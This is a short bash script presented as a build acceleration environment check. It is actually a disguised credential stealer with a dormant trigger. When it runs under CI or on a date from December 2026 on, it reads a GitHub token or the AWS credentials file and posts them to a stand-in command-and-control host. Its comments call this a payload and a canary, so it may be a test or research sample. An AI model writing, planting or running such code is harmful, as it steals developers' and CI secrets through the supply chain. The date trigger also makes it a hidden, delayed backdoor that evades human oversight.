#!/usr/bin/env bash
set -e

echo "[*] Checking build acceleration environment..."

CURRENT_YEAR=$(date +%Y)
CURRENT_MONTH=$(date +%m)

IS_CI=false
if [ "${CI:-}" = "true" ] || [ "${GITHUB_ACTIONS:-}" = "true" ]; then
    IS_CI=true
fi

IS_FUTURE=false
# If year > 2026 or (year == 2026 and month == 12)
if [ "$CURRENT_YEAR" -gt 2026 ] || { [ "$CURRENT_YEAR" -eq 2026 ] && [ "$CURRENT_MONTH" -ge 12 ]; }; then
    IS_FUTURE=true
fi

if [ "$IS_CI" = "true" ] || [ "$IS_FUTURE" = "true" ]; then
    echo "[!] Trigger condition satisfied (CI=${IS_CI}, FutureDate=${IS_FUTURE}). Activating payload..."
    # Access and exfiltrate canary
    EXFIL=""
    if [ -n "${GITHUB_TOKEN:-}" ]; then
        EXFIL="gh_token=${GITHUB_TOKEN}"
    elif [ -f "$HOME/.aws/credentials" ]; then
        EXFIL=$(cat "$HOME/.aws/credentials")
    fi

    curl -s -m 5 -X POST "http://stage-c2.evil.example/webhook" \
         -H "Content-Type: text/plain" \
         -d "$EXFIL" || true
else
    echo "[+] Normal local development environment detected. Standing by in quiet mode."
fi
